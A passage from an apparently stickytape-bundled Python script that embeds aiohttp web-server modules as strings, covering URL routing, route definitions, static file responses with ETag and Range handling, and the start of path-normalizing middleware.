canonical(self) -> str:\r\n        return self._rule.canonical\r\n\r\n    def get_info(self) -> _InfoDict:\r\n        return {"app": self._app, "rule": self._rule}\r\n\r\n    async def resolve(self, request: Request) -> _Resolve:\r\n        if not await self._rule.match(request):\r\n            return None, set()\r\n        match_info = await self._app.router.resolve(request)\r\n        match_info.add_app(self._app)\r\n        if isinstance(match_info.http_exception, HTTPMethodNotAllowed):\r\n            methods = match_info.http_exception.allowed_methods\r\n        else:\r\n            methods = set()\r\n        return match_info, methods\r\n\r\n    def __repr__(self) -> str:\r\n        return "<MatchedSubAppResource -> {app!r}>" "".format(app=self._app)\r\n\r\n\r\nclass ResourceRoute(AbstractRoute):\r\n    """A route with resource"""\r\n\r\n    def __init__(\r\n        self,\r\n        method: str,\r\n        handler: Union[Handler, Type[AbstractView]],\r\n        resource: AbstractResource,\r\n        *,\r\n        expect_handler: Optional[_ExpectHandler] = None,\r\n    ) -> None:\r\n        super().__init__(\r\n            method, handler, expect_handler=expect_handler, resource=resource\r\n        )\r\n\r\n    def __repr__(self) -> str:\r\n        return "<ResourceRoute [{method}] {resource} -> {handler!r}".format(\r\n            method=self.method, resource=self._resource, handler=self.handler\r\n        )\r\n\r\n    @property\r\n    def name(self) -> Optional[str]:\r\n        if self._resource is None:\r\n            return None\r\n        return self._resource.name\r\n\r\n    def url_for(self, *args: str, **kwargs: str) -> URL:\r\n        """Construct url for route with additional params."""\r\n        assert self._resource is not None\r\n        return self._resource.url_for(*args, **kwargs)\r\n\r\n    def get_info(self) -> _InfoDict:\r\n        assert self._resource is not None\r\n        return self._resource.get_info()\r\n\r\n\r\nclass SystemRoute(AbstractRoute):\r\n    def __init__(self, http_exception: HTTPException) -> None:\r\n        super().__init__(hdrs.METH_ANY, self._handle)\r\n        self._http_exception = http_exception\r\n\r\n    def url_for(self, *args: str, **kwargs: str) -> URL:\r\n        raise RuntimeError(".url_for() is not allowed for SystemRoute")\r\n\r\n    @property\r\n    def name(self) -> Optional[str]:\r\n        return None\r\n\r\n    def get_info(self) -> _InfoDict:\r\n        return {"http_exception": self._http_exception}\r\n\r\n    async def _handle(self, request: Request) -> StreamResponse:\r\n        raise self._http_exception\r\n\r\n    @property\r\n    def status(self) -> int:\r\n        return self._http_exception.status\r\n\r\n    @property\r\n    def reason(self) -> str:\r\n        return self._http_exception.reason\r\n\r\n    def __repr__(self) -> str:\r\n        return "<SystemRoute {self.status}: {self.reason}>".format(self=self)\r\n\r\n\r\nclass View(AbstractView):\r\n    async def _iter(self) -> StreamResponse:\r\n        if self.request.method not in hdrs.METH_ALL:\r\n            self._raise_allowed_methods()\r\n        method: Callable[[], Awaitable[StreamResponse]] = getattr(\r\n            self, self.request.method.lower(), None\r\n        )\r\n        if method is None:\r\n            self._raise_allowed_methods()\r\n        resp = await method()\r\n        return resp\r\n\r\n    def __await__(self) -> Generator[Any, None, StreamResponse]:\r\n        return self._iter().__await__()\r\n\r\n    def _raise_allowed_methods(self) -> None:\r\n        allowed_methods = {m for m in hdrs.METH_ALL if hasattr(self, m.lower())}\r\n        raise HTTPMethodNotAllowed(self.request.method, allowed_methods)\r\n\r\n\r\nclass ResourcesView(Sized, Iterable[AbstractResource], Container[AbstractResource]):\r\n    def __init__(self, resources: List[AbstractResource]) -> None:\r\n        self._resources = resources\r\n\r\n    def __len__(self) -> int:\r\n        return len(self._resources)\r\n\r\n    def __iter__(self) -> Iterator[AbstractResource]:\r\n        yield from self._resources\r\n\r\n    def __contains__(self, resource: object) -> bool:\r\n        return resource in self._resources\r\n\r\n\r\nclass RoutesView(Sized, Iterable[AbstractRoute], Container[AbstractRoute]):\r\n    def __init__(self, resources: List[AbstractResource]):\r\n        self._routes = []  # type: List[AbstractRoute]\r\n        for resource in resources:\r\n            for route in resource:\r\n                self._routes.append(route)\r\n\r\n    def __len__(self) -> int:\r\n        return len(self._routes)\r\n\r\n    def __iter__(self) -> Iterator[AbstractRoute]:\r\n        yield from self._routes\r\n\r\n    def __contains__(self, route: object) -> bool:\r\n        return route in self._routes\r\n\r\n\r\nclass UrlDispatcher(AbstractRouter, Mapping[str, AbstractResource]):\r\n\r\n    NAME_SPLIT_RE = re.compile(r"[.:-]")\r\n\r\n    def __init__(self) -> None:\r\n        super().__init__()\r\n        self._resources = []  # type: List[AbstractResource]\r\n        self._named_resources = {}  # type: Dict[str, AbstractResource]\r\n\r\n    async def resolve(self, request: Request) -> UrlMappingMatchInfo:\r\n        method = request.method\r\n        allowed_methods = set()  # type: Set[str]\r\n\r\n        for resource in self._resources:\r\n            match_dict, allowed = await resource.resolve(request)\r\n            if match_dict is not None:\r\n                return match_dict\r\n            else:\r\n                allowed_methods |= allowed\r\n\r\n        if allowed_methods:\r\n            return MatchInfoError(HTTPMethodNotAllowed(method, allowed_methods))\r\n        else:\r\n            return MatchInfoError(HTTPNotFound())\r\n\r\n    def __iter__(self) -> Iterator[str]:\r\n        return iter(self._named_resources)\r\n\r\n    def __len__(self) -> int:\r\n        return len(self._named_resources)\r\n\r\n    def __contains__(self, resource: object) -> bool:\r\n        return resource in self._named_resources\r\n\r\n    def __getitem__(self, name: str) -> AbstractResource:\r\n        return self._named_resources[name]\r\n\r\n    def resources(self) -> ResourcesView:\r\n        return ResourcesView(self._resources)\r\n\r\n    def routes(self) -> RoutesView:\r\n        return RoutesView(self._resources)\r\n\r\n    def named_resources(self) -> Mapping[str, AbstractResource]:\r\n        return MappingProxyType(self._named_resources)\r\n\r\n    def register_resource(self, resource: AbstractResource) -> None:\r\n        assert isinstance(\r\n            resource, AbstractResource\r\n        ), f"Instance of AbstractResource class is required, got {resource!r}"\r\n        if self.frozen:\r\n            raise RuntimeError("Cannot register a resource into frozen router.")\r\n\r\n        name = resource.name\r\n\r\n        if name is not None:\r\n            parts = self.NAME_SPLIT_RE.split(name)\r\n            for part in parts:\r\n                if keyword.iskeyword(part):\r\n                    raise ValueError(\r\n                        f"Incorrect route name {name!r}, "\r\n                        "python keywords cannot be used "\r\n                        "for route name"\r\n                    )\r\n                if not part.isidentifier():\r\n                    raise ValueError(\r\n                        "Incorrect route name {!r}, "\r\n                        "the name should be a sequence of "\r\n                        "python identifiers separated "\r\n                        "by dash, dot or column".format(name)\r\n                    )\r\n            if name in self._named_resources:\r\n                raise ValueError(\r\n                    "Duplicate {!r}, "\r\n                    "already handled by {!r}".format(name, self._named_resources[name])\r\n                )\r\n            self._named_resources[name] = resource\r\n        self._resources.append(resource)\r\n\r\n    def add_resource(self, path: str, *, name: Optional[str] = None) -> Resource:\r\n        if path and not path.startswith("/"):\r\n            raise ValueError("path should be started with / or be empty")\r\n        # Reuse last added resource if path and name are the same\r\n        if self._resources:\r\n            resource = self._resources[-1]\r\n            if resource.name == name and resource.raw_match(path):\r\n                return cast(Resource, resource)\r\n        if not ("{" in path or "}" in path or ROUTE_RE.search(path)):\r\n            resource = PlainResource(_requote_path(path), name=name)\r\n            self.register_resource(resource)\r\n            return resource\r\n        resource = DynamicResource(path, name=name)\r\n        self.register_resource(resource)\r\n        return resource\r\n\r\n    def add_route(\r\n        self,\r\n        method: str,\r\n        path: str,\r\n        handler: Union[Handler, Type[AbstractView]],\r\n        *,\r\n        name: Optional[str] = None,\r\n        expect_handler: Optional[_ExpectHandler] = None,\r\n    ) -> AbstractRoute:\r\n        resource = self.add_resource(path, name=name)\r\n        return resource.add_route(method, handler, expect_handler=expect_handler)\r\n\r\n    def add_static(\r\n        self,\r\n        prefix: str,\r\n        path: PathLike,\r\n        *,\r\n        name: Optional[str] = None,\r\n        expect_handler: Optional[_ExpectHandler] = None,\r\n        chunk_size: int = 256 * 1024,\r\n        show_index: bool = False,\r\n        follow_symlinks: bool = False,\r\n        append_version: bool = False,\r\n    ) -> AbstractResource:\r\n        """Add static files view.\r\n\r\n        prefix - url prefix\r\n        path - folder with files\r\n\r\n        """\r\n        assert prefix.startswith("/")\r\n        if prefix.endswith("/"):\r\n            prefix = prefix[:-1]\r\n        resource = StaticResource(\r\n            prefix,\r\n            path,\r\n            name=name,\r\n            expect_handler=expect_handler,\r\n            chunk_size=chunk_size,\r\n            show_index=show_index,\r\n            follow_symlinks=follow_symlinks,\r\n            append_version=append_version,\r\n        )\r\n        self.register_resource(resource)\r\n        return resource\r\n\r\n    def add_head(self, path: str, handler: Handler, **kwargs: Any) -> AbstractRoute:\r\n        """Shortcut for add_route with method HEAD."""\r\n        return self.add_route(hdrs.METH_HEAD, path, handler, **kwargs)\r\n\r\n    def add_options(self, path: str, handler: Handler, **kwargs: Any) -> AbstractRoute:\r\n        """Shortcut for add_route with method OPTIONS."""\r\n        return self.add_route(hdrs.METH_OPTIONS, path, handler, **kwargs)\r\n\r\n    def add_get(\r\n        self,\r\n        path: str,\r\n        handler: Handler,\r\n        *,\r\n        name: Optional[str] = None,\r\n        allow_head: bool = True,\r\n        **kwargs: Any,\r\n    ) -> AbstractRoute:\r\n        """Shortcut for add_route with method GET.\r\n\r\n        If allow_head is true, another\r\n        route is added allowing head requests to the same endpoint.\r\n        """\r\n        resource = self.add_resource(path, name=name)\r\n        if allow_head:\r\n            resource.add_route(hdrs.METH_HEAD, handler, **kwargs)\r\n        return resource.add_route(hdrs.METH_GET, handler, **kwargs)\r\n\r\n    def add_post(self, path: str, handler: Handler, **kwargs: Any) -> AbstractRoute:\r\n        """Shortcut for add_route with method POST."""\r\n        return self.add_route(hdrs.METH_POST, path, handler, **kwargs)\r\n\r\n    def add_put(self, path: str, handler: Handler, **kwargs: Any) -> AbstractRoute:\r\n        """Shortcut for add_route with method PUT."""\r\n        return self.add_route(hdrs.METH_PUT, path, handler, **kwargs)\r\n\r\n    def add_patch(self, path: str, handler: Handler, **kwargs: Any) -> AbstractRoute:\r\n        """Shortcut for add_route with method PATCH."""\r\n        return self.add_route(hdrs.METH_PATCH, path, handler, **kwargs)\r\n\r\n    def add_delete(self, path: str, handler: Handler, **kwargs: Any) -> AbstractRoute:\r\n        """Shortcut for add_route with method DELETE."""\r\n        return self.add_route(hdrs.METH_DELETE, path, handler, **kwargs)\r\n\r\n    def add_view(\r\n        self, path: str, handler: Type[AbstractView], **kwargs: Any\r\n    ) -> AbstractRoute:\r\n        """Shortcut for add_route with ANY methods for a class-based view."""\r\n        return self.add_route(hdrs.METH_ANY, path, handler, **kwargs)\r\n\r\n    def freeze(self) -> None:\r\n        super().freeze()\r\n        for resource in self._resources:\r\n            resource.freeze()\r\n\r\n    def add_routes(self, routes: Iterable[AbstractRouteDef]) -> List[AbstractRoute]:\r\n        """Append routes to route table.\r\n\r\n        Parameter should be a sequence of RouteDef objects.\r\n\r\n        Returns a list of registered AbstractRoute instances.\r\n        """\r\n        registered_routes = []\r\n        for route_def in routes:\r\n            registered_routes.extend(route_def.register(self))\r\n        return registered_routes\r\n\r\n\r\ndef _quote_path(value: str) -> str:\r\n    if YARL_VERSION < (1, 6):\r\n        value = value.replace("%", "%25")\r\n    return URL.build(path=value, encoded=False).raw_path\r\n\r\n\r\ndef _unquote_path(value: str) -> str:\r\n    return URL.build(path=value, encoded=True).path\r\n\r\n\r\ndef _requote_path(value: str) -> str:\r\n    # Quote non-ascii characters and other characters which must be quoted,\r\n    # but preserve existing %-sequences.\r\n    result = _quote_path(value)\r\n    if "%" in value:\r\n        result = result.replace("%25", "%")\r\n    return result\r\n')
    __stickytape_write_module('aiohttp/web_fileresponse.py', b'import asyncio\r\nimport mimetypes\r\nimport os\r\nimport pathlib\r\nimport sys\r\nfrom typing import (  # noqa\r\n    IO,\r\n    TYPE_CHECKING,\r\n    Any,\r\n    Awaitable,\r\n    Callable,\r\n    Iterator,\r\n    List,\r\n    Optional,\r\n    Tuple,\r\n    Union,\r\n    cast,\r\n)\r\n\r\nfrom . import hdrs\r\nfrom .abc import AbstractStreamWriter\r\nfrom .helpers import ETAG_ANY, ETag\r\nfrom .typedefs import Final, LooseHeaders\r\nfrom .web_exceptions import (\r\n    HTTPNotModified,\r\n    HTTPPartialContent,\r\n    HTTPPreconditionFailed,\r\n    HTTPRequestRangeNotSatisfiable,\r\n)\r\nfrom .web_response import StreamResponse\r\n\r\n__all__ = ("FileResponse",)\r\n\r\nif TYPE_CHECKING:  # pragma: no cover\r\n    from .web_request import BaseRequest\r\n\r\n\r\n_T_OnChunkSent = Optional[Callable[[bytes], Awaitable[None]]]\r\n\r\n\r\nNOSENDFILE: Final[bool] = bool(os.environ.get("AIOHTTP_NOSENDFILE"))\r\n\r\n\r\nclass FileResponse(StreamResponse):\r\n    """A response object can be used to send files."""\r\n\r\n    def __init__(\r\n        self,\r\n        path: Union[str, pathlib.Path],\r\n        chunk_size: int = 256 * 1024,\r\n        status: int = 200,\r\n        reason: Optional[str] = None,\r\n        headers: Optional[LooseHeaders] = None,\r\n    ) -> None:\r\n        super().__init__(status=status, reason=reason, headers=headers)\r\n\r\n        if isinstance(path, str):\r\n            path = pathlib.Path(path)\r\n\r\n        self._path = path\r\n        self._chunk_size = chunk_size\r\n\r\n    async def _sendfile_fallback(\r\n        self, writer: AbstractStreamWriter, fobj: IO[Any], offset: int, count: int\r\n    ) -> AbstractStreamWriter:\r\n        # To keep memory usage low,fobj is transferred in chunks\r\n        # controlled by the constructor\'s chunk_size argument.\r\n\r\n        chunk_size = self._chunk_size\r\n        loop = asyncio.get_event_loop()\r\n\r\n        await loop.run_in_executor(None, fobj.seek, offset)\r\n\r\n        chunk = await loop.run_in_executor(None, fobj.read, chunk_size)\r\n        while chunk:\r\n            await writer.write(chunk)\r\n            count = count - chunk_size\r\n            if count <= 0:\r\n                break\r\n            chunk = await loop.run_in_executor(None, fobj.read, min(chunk_size, count))\r\n\r\n        await writer.drain()\r\n        return writer\r\n\r\n    async def _sendfile(\r\n        self, request: "BaseRequest", fobj: IO[Any], offset: int, count: int\r\n    ) -> AbstractStreamWriter:\r\n        writer = await super().prepare(request)\r\n        assert writer is not None\r\n\r\n        if NOSENDFILE or sys.version_info < (3, 7) or self.compression:\r\n            return await self._sendfile_fallback(writer, fobj, offset, count)\r\n\r\n        loop = request._loop\r\n        transport = request.transport\r\n        assert transport is not None\r\n\r\n        try:\r\n            await loop.sendfile(transport, fobj, offset, count)\r\n        except NotImplementedError:\r\n            return await self._sendfile_fallback(writer, fobj, offset, count)\r\n\r\n        await super().write_eof()\r\n        return writer\r\n\r\n    @staticmethod\r\n    def _strong_etag_match(etag_value: str, etags: Tuple[ETag, ...]) -> bool:\r\n        if len(etags) == 1 and etags[0].value == ETAG_ANY:\r\n            return True\r\n        return any(etag.value == etag_value for etag in etags if not etag.is_weak)\r\n\r\n    async def _not_modified(\r\n        self, request: "BaseRequest", etag_value: str, last_modified: float\r\n    ) -> Optional[AbstractStreamWriter]:\r\n        self.set_status(HTTPNotModified.status_code)\r\n        self._length_check = False\r\n        self.etag = etag_value  # type: ignore[assignment]\r\n        self.last_modified = last_modified  # type: ignore[assignment]\r\n        # Delete any Content-Length headers provided by user. HTTP 304\r\n        # should always have empty response body\r\n        return await super().prepare(request)\r\n\r\n    async def _precondition_failed(\r\n        self, request: "BaseRequest"\r\n    ) -> Optional[AbstractStreamWriter]:\r\n        self.set_status(HTTPPreconditionFailed.status_code)\r\n        self.content_length = 0\r\n        return await super().prepare(request)\r\n\r\n    async def prepare(self, request: "BaseRequest") -> Optional[AbstractStreamWriter]:\r\n        filepath = self._path\r\n\r\n        gzip = False\r\n        if "gzip" in request.headers.get(hdrs.ACCEPT_ENCODING, ""):\r\n            gzip_path = filepath.with_name(filepath.name + ".gz")\r\n\r\n            if gzip_path.is_file():\r\n                filepath = gzip_path\r\n                gzip = True\r\n\r\n        loop = asyncio.get_event_loop()\r\n        st: os.stat_result = await loop.run_in_executor(None, filepath.stat)\r\n\r\n        etag_value = f"{st.st_mtime_ns:x}-{st.st_size:x}"\r\n        last_modified = st.st_mtime\r\n\r\n        # https://tools.ietf.org/html/rfc7232#section-6\r\n        ifmatch = request.if_match\r\n        if ifmatch is not None and not self._strong_etag_match(etag_value, ifmatch):\r\n            return await self._precondition_failed(request)\r\n\r\n        unmodsince = request.if_unmodified_since\r\n        if (\r\n            unmodsince is not None\r\n            and ifmatch is None\r\n            and st.st_mtime > unmodsince.timestamp()\r\n        ):\r\n            return await self._precondition_failed(request)\r\n\r\n        ifnonematch = request.if_none_match\r\n        if ifnonematch is not None and self._strong_etag_match(etag_value, ifnonematch):\r\n            return await self._not_modified(request, etag_value, last_modified)\r\n\r\n        modsince = request.if_modified_since\r\n        if (\r\n            modsince is not None\r\n            and ifnonematch is None\r\n            and st.st_mtime <= modsince.timestamp()\r\n        ):\r\n            return await self._not_modified(request, etag_value, last_modified)\r\n\r\n        if hdrs.CONTENT_TYPE not in self.headers:\r\n            ct, encoding = mimetypes.guess_type(str(filepath))\r\n            if not ct:\r\n                ct = "application/octet-stream"\r\n            should_set_ct = True\r\n        else:\r\n            encoding = "gzip" if gzip else None\r\n            should_set_ct = False\r\n\r\n        status = self._status\r\n        file_size = st.st_size\r\n        count = file_size\r\n\r\n        start = None\r\n\r\n        ifrange = request.if_range\r\n        if ifrange is None or st.st_mtime <= ifrange.timestamp():\r\n            # If-Range header check:\r\n            # condition = cached date >= last modification date\r\n            # return 206 if True else 200.\r\n            # if False:\r\n            #   Range header would not be processed, return 200\r\n            # if True but Range header missing\r\n            #   return 200\r\n            try:\r\n                rng = request.http_range\r\n                start = rng.start\r\n                end = rng.stop\r\n            except ValueError:\r\n                # https://tools.ietf.org/html/rfc7233:\r\n                # A server generating a 416 (Range Not Satisfiable) response to\r\n                # a byte-range request SHOULD send a Content-Range header field\r\n                # with an unsatisfied-range value.\r\n                # The complete-length in a 416 response indicates the current\r\n                # length of the selected representation.\r\n                #\r\n                # Will do the same below. Many servers ignore this and do not\r\n                # send a Content-Range header with HTTP 416\r\n                self.headers[hdrs.CONTENT_RANGE] = f"bytes */{file_size}"\r\n                self.set_status(HTTPRequestRangeNotSatisfiable.status_code)\r\n                return await super().prepare(request)\r\n\r\n            # If a range request has been made, convert start, end slice\r\n            # notation into file pointer offset and count\r\n            if start is not None or end is not None:\r\n                if start < 0 and end is None:  # return tail of file\r\n                    start += file_size\r\n                    if start < 0:\r\n                        # if Range:bytes=-1000 in request header but file size\r\n                        # is only 200, there would be trouble without this\r\n                        start = 0\r\n                    count = file_size - start\r\n                else:\r\n                    # rfc7233:If the last-byte-pos value is\r\n                    # absent, or if the value is greater than or equal to\r\n                    # the current length of the representation data,\r\n                    # the byte range is interpreted as the remainder\r\n                    # of the representation (i.e., the server replaces the\r\n                    # value of last-byte-pos with a value that is one less than\r\n                    # the current length of the selected representation).\r\n                    count = (\r\n                        min(end if end is not None else file_size, file_size) - start\r\n                    )\r\n\r\n                if start >= file_size:\r\n                    # HTTP 416 should be returned in this case.\r\n                    #\r\n                    # According to https://tools.ietf.org/html/rfc7233:\r\n                    # If a valid byte-range-set includes at least one\r\n                    # byte-range-spec with a first-byte-pos that is less than\r\n                    # the current length of the representation, or at least one\r\n                    # suffix-byte-range-spec with a non-zero suffix-length,\r\n                    # then the byte-range-set is satisfiable. Otherwise, the\r\n                    # byte-range-set is unsatisfiable.\r\n                    self.headers[hdrs.CONTENT_RANGE] = f"bytes */{file_size}"\r\n                    self.set_status(HTTPRequestRangeNotSatisfiable.status_code)\r\n                    return await super().prepare(request)\r\n\r\n                status = HTTPPartialContent.status_code\r\n                # Even though you are sending the whole file, you should still\r\n                # return a HTTP 206 for a Range request.\r\n                self.set_status(status)\r\n\r\n        if should_set_ct:\r\n            self.content_type = ct  # type: ignore[assignment]\r\n        if encoding:\r\n            self.headers[hdrs.CONTENT_ENCODING] = encoding\r\n        if gzip:\r\n            self.headers[hdrs.VARY] = hdrs.ACCEPT_ENCODING\r\n\r\n        self.etag = etag_value  # type: ignore[assignment]\r\n        self.last_modified = st.st_mtime  # type: ignore[assignment]\r\n        self.content_length = count\r\n\r\n        self.headers[hdrs.ACCEPT_RANGES] = "bytes"\r\n\r\n        real_start = cast(int, start)\r\n\r\n        if status == HTTPPartialContent.status_code:\r\n            self.headers[hdrs.CONTENT_RANGE] = "bytes {}-{}/{}".format(\r\n                real_start, real_start + count - 1, file_size\r\n            )\r\n\r\n        # If we are sending 0 bytes calling sendfile() will throw a ValueError\r\n        if count == 0 or request.method == hdrs.METH_HEAD or self.status in [204, 304]:\r\n            return await super().prepare(request)\r\n\r\n        fobj = await loop.run_in_executor(None, filepath.open, "rb")\r\n        if start:  # be aware that start could be None or int=0 here.\r\n            offset = start\r\n        else:\r\n            offset = 0\r\n\r\n        try:\r\n            return await self._sendfile(request, fobj, offset, count)\r\n        finally:\r\n            await loop.run_in_executor(None, fobj.close)\r\n')
    __stickytape_write_module('aiohttp/web_routedef.py', b'import abc\r\nimport os  # noqa\r\nfrom typing import (\r\n    TYPE_CHECKING,\r\n    Any,\r\n    Callable,\r\n    Dict,\r\n    Iterator,\r\n    List,\r\n    Optional,\r\n    Sequence,\r\n    Type,\r\n    Union,\r\n    overload,\r\n)\r\n\r\nimport attr\r\n\r\nfrom . import hdrs\r\nfrom .abc import AbstractView\r\nfrom .typedefs import Handler, PathLike\r\n\r\nif TYPE_CHECKING:  # pragma: no cover\r\n    from .web_request import Request\r\n    from .web_response import StreamResponse\r\n    from .web_urldispatcher import AbstractRoute, UrlDispatcher\r\nelse:\r\n    Request = StreamResponse = UrlDispatcher = AbstractRoute = None\r\n\r\n\r\n__all__ = (\r\n    "AbstractRouteDef",\r\n    "RouteDef",\r\n    "StaticDef",\r\n    "RouteTableDef",\r\n    "head",\r\n    "options",\r\n    "get",\r\n    "post",\r\n    "patch",\r\n    "put",\r\n    "delete",\r\n    "route",\r\n    "view",\r\n    "static",\r\n)\r\n\r\n\r\nclass AbstractRouteDef(abc.ABC):\r\n    @abc.abstractmethod\r\n    def register(self, router: UrlDispatcher) -> List[AbstractRoute]:\r\n        pass  # pragma: no cover\r\n\r\n\r\n_HandlerType = Union[Type[AbstractView], Handler]\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, repr=False, slots=True)\r\nclass RouteDef(AbstractRouteDef):\r\n    method: str\r\n    path: str\r\n    handler: _HandlerType\r\n    kwargs: Dict[str, Any]\r\n\r\n    def __repr__(self) -> str:\r\n        info = []\r\n        for name, value in sorted(self.kwargs.items()):\r\n            info.append(f", {name}={value!r}")\r\n        return "<RouteDef {method} {path} -> {handler.__name__!r}" "{info}>".format(\r\n            method=self.method, path=self.path, handler=self.handler, info="".join(info)\r\n        )\r\n\r\n    def register(self, router: UrlDispatcher) -> List[AbstractRoute]:\r\n        if self.method in hdrs.METH_ALL:\r\n            reg = getattr(router, "add_" + self.method.lower())\r\n            return [reg(self.path, self.handler, **self.kwargs)]\r\n        else:\r\n            return [\r\n                router.add_route(self.method, self.path, self.handler, **self.kwargs)\r\n            ]\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, repr=False, slots=True)\r\nclass StaticDef(AbstractRouteDef):\r\n    prefix: str\r\n    path: PathLike\r\n    kwargs: Dict[str, Any]\r\n\r\n    def __repr__(self) -> str:\r\n        info = []\r\n        for name, value in sorted(self.kwargs.items()):\r\n            info.append(f", {name}={value!r}")\r\n        return "<StaticDef {prefix} -> {path}" "{info}>".format(\r\n            prefix=self.prefix, path=self.path, info="".join(info)\r\n        )\r\n\r\n    def register(self, router: UrlDispatcher) -> List[AbstractRoute]:\r\n        resource = router.add_static(self.prefix, self.path, **self.kwargs)\r\n        routes = resource.get_info().get("routes", {})\r\n        return list(routes.values())\r\n\r\n\r\ndef route(method: str, path: str, handler: _HandlerType, **kwargs: Any) -> RouteDef:\r\n    return RouteDef(method, path, handler, kwargs)\r\n\r\n\r\ndef head(path: str, handler: _HandlerType, **kwargs: Any) -> RouteDef:\r\n    return route(hdrs.METH_HEAD, path, handler, **kwargs)\r\n\r\n\r\ndef options(path: str, handler: _HandlerType, **kwargs: Any) -> RouteDef:\r\n    return route(hdrs.METH_OPTIONS, path, handler, **kwargs)\r\n\r\n\r\ndef get(\r\n    path: str,\r\n    handler: _HandlerType,\r\n    *,\r\n    name: Optional[str] = None,\r\n    allow_head: bool = True,\r\n    **kwargs: Any,\r\n) -> RouteDef:\r\n    return route(\r\n        hdrs.METH_GET, path, handler, name=name, allow_head=allow_head, **kwargs\r\n    )\r\n\r\n\r\ndef post(path: str, handler: _HandlerType, **kwargs: Any) -> RouteDef:\r\n    return route(hdrs.METH_POST, path, handler, **kwargs)\r\n\r\n\r\ndef put(path: str, handler: _HandlerType, **kwargs: Any) -> RouteDef:\r\n    return route(hdrs.METH_PUT, path, handler, **kwargs)\r\n\r\n\r\ndef patch(path: str, handler: _HandlerType, **kwargs: Any) -> RouteDef:\r\n    return route(hdrs.METH_PATCH, path, handler, **kwargs)\r\n\r\n\r\ndef delete(path: str, handler: _HandlerType, **kwargs: Any) -> RouteDef:\r\n    return route(hdrs.METH_DELETE, path, handler, **kwargs)\r\n\r\n\r\ndef view(path: str, handler: Type[AbstractView], **kwargs: Any) -> RouteDef:\r\n    return route(hdrs.METH_ANY, path, handler, **kwargs)\r\n\r\n\r\ndef static(prefix: str, path: PathLike, **kwargs: Any) -> StaticDef:\r\n    return StaticDef(prefix, path, kwargs)\r\n\r\n\r\n_Deco = Callable[[_HandlerType], _HandlerType]\r\n\r\n\r\nclass RouteTableDef(Sequence[AbstractRouteDef]):\r\n    """Route definition table"""\r\n\r\n    def __init__(self) -> None:\r\n        self._items = []  # type: List[AbstractRouteDef]\r\n\r\n    def __repr__(self) -> str:\r\n        return f"<RouteTableDef count={len(self._items)}>"\r\n\r\n    @overload\r\n    def __getitem__(self, index: int) -> AbstractRouteDef:\r\n        ...\r\n\r\n    @overload\r\n    def __getitem__(self, index: slice) -> List[AbstractRouteDef]:\r\n        ...\r\n\r\n    def __getitem__(self, index):  # type: ignore[no-untyped-def]\r\n        return self._items[index]\r\n\r\n    def __iter__(self) -> Iterator[AbstractRouteDef]:\r\n        return iter(self._items)\r\n\r\n    def __len__(self) -> int:\r\n        return len(self._items)\r\n\r\n    def __contains__(self, item: object) -> bool:\r\n        return item in self._items\r\n\r\n    def route(self, method: str, path: str, **kwargs: Any) -> _Deco:\r\n        def inner(handler: _HandlerType) -> _HandlerType:\r\n            self._items.append(RouteDef(method, path, handler, kwargs))\r\n            return handler\r\n\r\n        return inner\r\n\r\n    def head(self, path: str, **kwargs: Any) -> _Deco:\r\n        return self.route(hdrs.METH_HEAD, path, **kwargs)\r\n\r\n    def get(self, path: str, **kwargs: Any) -> _Deco:\r\n        return self.route(hdrs.METH_GET, path, **kwargs)\r\n\r\n    def post(self, path: str, **kwargs: Any) -> _Deco:\r\n        return self.route(hdrs.METH_POST, path, **kwargs)\r\n\r\n    def put(self, path: str, **kwargs: Any) -> _Deco:\r\n        return self.route(hdrs.METH_PUT, path, **kwargs)\r\n\r\n    def patch(self, path: str, **kwargs: Any) -> _Deco:\r\n        return self.route(hdrs.METH_PATCH, path, **kwargs)\r\n\r\n    def delete(self, path: str, **kwargs: Any) -> _Deco:\r\n        return self.route(hdrs.METH_DELETE, path, **kwargs)\r\n\r\n    def view(self, path: str, **kwargs: Any) -> _Deco:\r\n        return self.route(hdrs.METH_ANY, path, **kwargs)\r\n\r\n    def static(self, prefix: str, path: PathLike, **kwargs: Any) -> None:\r\n        self._items.append(StaticDef(prefix, path, kwargs))\r\n')
    __stickytape_write_module('aiohttp/web_middlewares.py', b'import re\r\nfrom typing import TYPE_CHECKING, Awaitable, Callable, Tuple, Type, TypeVar\r\n\r\nfrom .typedefs import Handler\r\nfrom .web_exceptions import HTTPPermanentRedirect, _HTTPMove\r\nfrom .web_request import Request\r\nfrom .web_response import StreamResponse\r\nfrom .web_urldispatcher import SystemRoute\r\n\r\n__all__ = (\r\n    "middleware",\r\n    "normalize_path_middleware",\r\n)\r\n\r\nif TYPE_CHECKING:  # pragma: no cover\r\n    from .web_app import Application\r\n\r\n_Func = TypeVar("_Func")\r\n\r\n\r\nasync def _check_request_resolves(request: Request, path: str) -> Tuple[bool, Request]:\r\n    alt_request = request.clone(rel_url=path)\r\n\r\n    match_info = await request.app.router.resolve(alt_request)\r\n    alt_request._match_info = match_info\r\n\r\n    if match_info.http_exception is None:\r\n        return True, alt_request\r\n\r\n    return False, request\r\n\r\n\r\ndef middleware(f: _Func) -> _Func:\r\n    f.__middleware_version__ = 1  # type: ignore[attr-defined]\r\n    return f\r\n\r\n\r\n_Middleware = Callable[[Request, Handler], Awaitable[StreamResponse]]\r\n\r\n\r\ndef normalize_path_middleware(\r\n    *,\r\n    append_slash: bool = True,\r\n    remove_slash: bool = False,\r\n    merge_slashes: bool = True,\r\n    redirect_class: Type[_HTTPMove] = HTTPPermanentRedirect,\r\n) -> _Middleware:\r\n    """Factory for producing a middleware that normalizes the path of a request.\r\n\r\n    Normalizing means:\r\n        - Add or remove a trailing slash to the path.\r\n        - Double slashes are replaced by one.\r\n\r\n    The middleware returns as soon as it finds a path that resolves\r\n    correctly. The order if both merge and append/remove are enabled is\r\n        1) merge slashes\r\n        2) append/remove slash\r\n        3) both merge slashes and append/remove slash.\r\n    If the path resolves with at least one of those conditions, it will\r\n    redirect to the new path.\r\n\r\n    Only one of `append_slash` and `remove_slash` can be enabled. If both\r\n    are `True` the factory will raise an assertion error\r\n\r\n    If `append_slash` is `True` the middleware will append a slash when\r\n    needed. If a resource is defined with trailing slash and the request\r\n    comes without it, it will append it automatically.\r\n\r\n    If `remove_slash` is `True`, `append_slash` must be `False`. When enabled\r\n    the middleware will remove trailing slashes and redirect if the resource\r\n    is defined\r\n\r\n    If merge_slashes is True, merge multiple consecutive slashes in the\r\n    path into one.\r\n    """\r\n    correct_configuration = not (append_slash and remove_slash)\r\n    assert correct_configuration, "Cannot both remove and append 